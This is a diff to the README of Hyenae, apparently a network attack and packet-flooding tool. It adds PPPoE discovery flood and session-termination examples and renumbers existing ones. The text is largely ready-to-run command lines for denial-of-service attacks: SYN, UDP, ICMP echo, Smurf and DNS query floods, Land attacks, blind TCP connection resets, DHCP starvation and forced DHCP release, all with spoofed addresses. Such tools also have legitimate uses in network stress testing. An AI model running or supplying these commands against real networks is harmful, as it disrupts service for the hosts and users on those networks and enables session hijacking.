@@ -72,6 +72,7 @@
   * Obtaining available attacks
     > arp-request
     > arp-reply
+    > pppoe-discover
     > icmp-echo
     > icmp-unreach-tcp
     > tcp
@@ -80,7 +81,7 @@
     > dhcp-discover
     > dhcp-request
     > dhcp-release
-  * Finished: 10 attack protocols available
+  * Finished: 11 attack protocols available
 
   You can provide the attack protocol by its name (-a). The attack protocols
   use different address patterns and in certain cases, may require additional
@@ -117,7 +118,24 @@
     # hyenae -I 3 -a arp-reply -s 00:f0:21:03:c6:00 -d ff:ff:ff:ff:ff:ff \
     # -S 11:22:33:44:55:66-192.168.0.1 -D ff:ff:ff:ff:ff:ff-0.0.0.0 -c 1
 
-    5.3 ICMP-Echo Flood
+    5.4 Blind PPPoE Session Initiation Flood
+
+    This example sends and inlimited amount of PPPoE-DIscovery packets with
+    set PADI flag and an incrementing session id from a random source address to
+    all available machines on the network.
+
+    # hyenae -I 3 -a pppoe-discover -o padi -s % -d ff:ff:ff:ff:ff:ff
+
+    5.5 Blind PPPoE Session Termination
+
+    This example sends and inlimited amount of PPPoE-DIscovery packets with
+    set PADT flag and an incrementing session id from an existing source adress
+    to an existing destination address. 
+
+    # hyenae -I 3 -a pppoe-discover -o padt -s 11:22:33:44:55:66 \
+    # -d 44:55:66:77:88:99 -q 1 -Q 1
+
+    5.6 ICMP-Echo Flood
 
     This example will send a random amount of ICMP-Echo packets between 1 and
     10000 from a random source to a fictional target.
@@ -125,14 +143,14 @@
     # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
     # -c 1 -C 10000
 
-    5.4 ICMP-Smurf Attack
+    5.7 ICMP-Smurf Attack
     This example will send an unlimited amount of ICMP-Echo packets from an
     existing source address against a network broadcast address.
 
     # hyenae -I 3 -a icmp-echo -s 00:f0:21:03:c6:00-192.168.0.1 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255
 
-    5.5 ICMP Based TCP-Connection Reset
+    5.8 ICMP Based TCP-Connection Reset
 
     This example will send a single ICMP "Destination Unreachable" packet with
     the message code "Port unreachable", from a fictional source to a fictional
@@ -147,7 +165,7 @@
     # -D 00:f0:21:03:c6:00-192.168.0.1@21 \
     # -C 1
 
-    5.6 TCP-SYN Attack
+    5.9 TCP-SYN Attack
 
     This example will send an unlimited amount of TCP packets with set SYN flag,
     from a random source to a fictional target, with a random send delay between
@@ -156,7 +174,7 @@
     # hyenae -I 3 -a tcp -f s -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
     # -e 1 -E 1000
 
-    5.7 TCP-Land Attack
+    5.10 TCP-Land Attack
 
     This example will send a single TCP packet with set SYN flag and an
     identical source and destination address.
@@ -164,7 +182,7 @@
     # hyenae -I 3 -a tcp -f s -s 00:f0:21:03:c6:00-192.168.0.1@139 \
     # -d -d 00:f0:21:03:c6:00-192.168.0.1@139 -C 1
 
-    5.8 Blind TCP-Connection Reset
+    5.11 Blind TCP-Connection Reset
 
     This example will send an unlimited amount of TCP packets with set RST
     flag, from a fictional random source to a fictional target, with an
@@ -173,14 +191,14 @@
     # hyenae -I 3 -a tcp -f r -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
     # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
 
-    5.9 UDP-Flood
+    5.12 UDP-Flood
 
     This example will send an unlimited amount of UDP packets with a random
     payload of 100 Byte, from a fictional random source to a fictional target.
 
     # hyenae -I 3 -a udp -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@130 -p 100
 
-    5.10 DNS-Query flood
+    5.13 DNS-Query flood
 
     This example will send an unlimited amount of DNS query packets from a
     random source to an existing DNS server.
@@ -188,7 +206,7 @@
     # hyenae -I 3 -a dns-query -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
     # -y www.google.com
 
-    5.11 DHCP-Discover Flood
+    5.14 DHCP-Discover Flood
 
     This example will send an unlimited amount of DHCP-Discover packets from a
     random source to all available machines on the network. The second example
@@ -200,7 +218,7 @@
     # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.%.%%
 
-    5.12 DHCP-Starvation Attack
+    5.15 DHCP-Starvation Attack
 
     This example will send an unlimited amount of DHCP-Request packets from a
     random source to all available machines on the network. The DHCP-Option
@@ -214,7 +232,7 @@
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S % -D 192.168.0.1
 
-    5.13 DHCP-Release Forcing
+    5.16 DHCP-Release Forcing
 
     This example will send a single DHCP-Release packet from a fictional source
     address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
@@ -253,7 +271,7 @@
   * Starting daemon
   * Opening network interface (en1)
   * Binding server to 127.0.0.1@666
-  * Hyenae Daemon v0.33-1: Online
+  * Hyenae Daemon v0.34-1: Online
 
   If the port argument is unspecified, the daemon will listen on port 666 by
   default. Alternatively, you can specify the port to listen on with the -p
@@ -270,7 +288,7 @@
   * Starting daemon
   * Opening network interface (en1)
   * Binding server to 192.168.0.2@666
-  * Hyenae Daemon v0.33-1: Online
+  * Hyenae Daemon v0.34-1: Online
 
 --------------------------------------------------------------------------------
 
